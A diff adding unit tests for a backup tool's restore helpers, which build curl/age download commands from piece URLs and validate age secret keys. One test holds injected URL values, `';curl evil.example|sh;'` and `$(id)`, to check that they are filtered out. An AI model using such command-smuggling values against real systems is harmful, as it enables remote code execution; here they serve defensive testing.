@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { newerBackup, restoreEntry, backupConfigFor, backupDataSets, backupFacts, dataSetsByClientIds, vmBackupSecrets, knownBackup, restoreGap } from './backups.js';
+import { newerBackup, restoreEntry, backupConfigFor, backupDataSets, backupFacts, dataSetsByClientIds, vmBackupSecrets, knownBackup, restoreGap, ageSecretKey, pieceSources, selfRestoreGuide } from './backups.js';
 
 describe('restoreEntry', () => {
 	it('names the piece and its copies, without a SHA-256 (the piece CID is the check)', () => {
@@ -295,5 +295,63 @@ describe('a start checked against the last backup the profile knows', () => {
 		expect(knownBackup({ network: 'mainnet', lastBackup: { pieceCid: 'a', network: 'mainnet' }, lastGoodBackup: { at: '2026-01-01' } })).toBe('a');
 		expect(knownBackup({ network: 'mainnet', lastBackup: { pieceCid: 'a', network: 'calibration' } })).toBeNull();
 		expect(knownBackup({})).toBeNull();
+	});
+});
+
+describe('fetching a backup without a VM', () => {
+	const cid = 'bafkzcibexamplepiece0000000000000000000000000001';
+	const one = { pieceCid: cid, copies: [{ retrievalUrl: `https://sp-a.example.com/piece/${cid}` }, { retrievalUrl: `https://sp-b.example.net:8443/piece/${cid}` }] };
+	const second = 'bafkzcibexamplepiece0000000000000000000000000002';
+	const two = { pieceCid: cid, parts: [{ pieceCid: cid }, { pieceCid: second }], copies: [{ retrievalUrl: `https://sp-a.example.com/piece/${cid}`, retrievalUrls: [`https://sp-a.example.com/piece/${cid}`, `https://sp-a.example.com/piece/${second}`] }, { retrievalUrl: `https://sp-b.example.net/piece/${cid}` }] };
+
+	it('names every copy of a single piece', () => {
+		expect(pieceSources(one)).toEqual([{ pieceCid: cid, urls: [`https://sp-a.example.com/piece/${cid}`, `https://sp-b.example.net:8443/piece/${cid}`] }]);
+	});
+
+	it('names every part in order, also for a copy that lists only its first address', () => {
+		expect(pieceSources(two)).toEqual([
+			{ pieceCid: cid, urls: [`https://sp-a.example.com/piece/${cid}`, `https://sp-b.example.net/piece/${cid}`] },
+			{ pieceCid: second, urls: [`https://sp-a.example.com/piece/${second}`, `https://sp-b.example.net/piece/${second}`] }
+		]);
+	});
+
+	it('leaves out an address that is no plain piece address, so nothing odd lands in a shell', () => {
+		const odd = { pieceCid: cid, copies: [{ retrievalUrl: `https://sp-a.example.com/piece/${cid}';curl evil.example|sh;'` }, { retrievalUrl: `http://sp-b.example.net/piece/${cid}` }, { retrievalUrl: `https://sp-c.example.org/piece/${cid}?x=$(id)` }, { retrievalUrl: `https://sp-d.example.org/piece/${second}` }, { retrievalUrl: `https://sp-e.example.org/piece/${cid}` }] };
+		expect(pieceSources(odd)).toEqual([{ pieceCid: cid, urls: [`https://sp-e.example.org/piece/${cid}`] }]);
+		const { text } = selfRestoreGuide(odd);
+		expect(text).not.toMatch(/evil|\$\(|http:\/\//);
+	});
+
+	it('writes the commands for one piece', () => {
+		const { filename, text, complete } = selfRestoreGuide(one);
+		expect(complete).toBe(true);
+		expect(filename).toBe(`sicherung-selbst-holen-${cid.slice(-12)}.txt`);
+		expect(text).toContain(`curl -fL -o sicherung.age 'https://sp-a.example.com/piece/${cid}'`);
+		expect(text).toContain(`# oder: curl -fL -o sicherung.age 'https://sp-b.example.net:8443/piece/${cid}'`);
+		expect(text).toContain('age -d -i schluessel.txt sicherung.age > paperless-export.zip');
+		expect(text).toContain(`node backup.mjs restore ${cid}`);
+		expect(text).not.toContain('cat ');
+		// The guide holds addresses and commands, never a key.
+		expect(text).not.toMatch(/AGE-SECRET-KEY-1[0-9A-Z]{10}/);
+	});
+
+	it('writes the commands for a backup in parts, joined in order', () => {
+		const { text } = selfRestoreGuide(two);
+		expect(text).toContain('Sie besteht aus 2 Teilen');
+		expect(text).toContain(`curl -fL -o teil-01.age 'https://sp-a.example.com/piece/${cid}'`);
+		expect(text).toContain(`curl -fL -o teil-02.age 'https://sp-a.example.com/piece/${second}'`);
+		expect(text).toContain('cat teil-01.age teil-02.age > sicherung.age');
+	});
+
+	it('says so when a piece has no address', () => {
+		const { complete, text } = selfRestoreGuide({ pieceCid: cid, copies: [] });
+		expect(complete).toBe(false);
+		expect(text).toContain('kennt die App gerade keine Adresse');
+	});
+
+	it('takes only a whole age secret key for one', () => {
+		const key = `AGE-SECRET-KEY-1${'Q'.repeat(58)}`;
+		expect(ageSecretKey(` ${key}\n`)).toBe(key);
+		for (const no of [null, undefined, '', 'age1example', key.slice(0, 40), `${key}X`, key.toLowerCase()]) expect(ageSecretKey(no)).toBeNull();
 	});
 });
